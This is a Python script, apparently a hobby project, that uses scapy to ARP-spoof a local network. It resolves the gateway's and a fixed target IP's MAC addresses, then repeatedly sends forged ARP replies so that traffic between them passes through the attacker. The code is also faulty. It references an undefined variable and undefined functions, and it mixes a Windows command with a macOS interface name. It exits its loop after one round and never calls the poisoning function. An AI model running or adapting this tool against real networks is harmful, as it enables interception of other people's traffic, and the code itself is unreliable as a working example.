
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp




def getDefaultGateway():
    CMDcommand = subprocess.check_output(['netsh','interface','ip','show','config','name="Ethernet"'])
    network_output = str(CMDcommand)
    network_array_output = network_output.replace("\\r"," ").replace("\\n"," ").split()
    for i in range(len(network_array_output)):
        if network_array_output[i] == "Default":
            gatewayIP = network_array_output[i+2]
            return gatewayIP


gateway_ip = getDefaultGateway()
interface = "en0"
target_ip = "192.168.0.19"
broadcast_mac = "ff:ff:ff:ff:ff:ff"
packets = 50

def getMac(IP):
    ans, unans = srp(Ether(dst=broadcast_mac)/ARP(pdst = IP), timeout =2,
iface=interface, inter=0.1)
    for send,recieve in ans:
        return r[Ether].src
    return None

try:
    gateway_mac = getMac(gateway_ip)
    print ("Gateway MAC :" + gateway_mac)
except:
    print ("Failed to get gateway MAC. Exiting.")
    sys.exit(0)
try:
    target_mac = getMac(target_ip)
    print ("Target MAC :" + target_mac)
except:
    print ("Failed to get target MAC. Exiting.")
    sys.exit(0)

def poison(gateway_ip,gateway_mac,target_ip,target_mac):
    targetPacket = ARP()
    targetPacket.op = 2
    targetPacket.psrc = gateway_ip
    targetPacket.pdst = target_ip
    targetPacket.hwdst= target_mac
    gatewayPacket = ARP()
    gatewayPacket.op = 2
    gatewayPacket.psrc = target_ip
    gatewayPacket.pdst = gateway_ip
    gatewayPacket.hwdst= gateway_mac
    while True:
        try:
            targetPacket.show()
            send(targetPacket)
            gatewayPacket.show()
            send(gatewayPacket)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            sys.exit(0)
        sys.exit(0)
        return


gateway_mac = getMac(defaultGatewayIP)
print("gateway max" + gateway_mac)

 




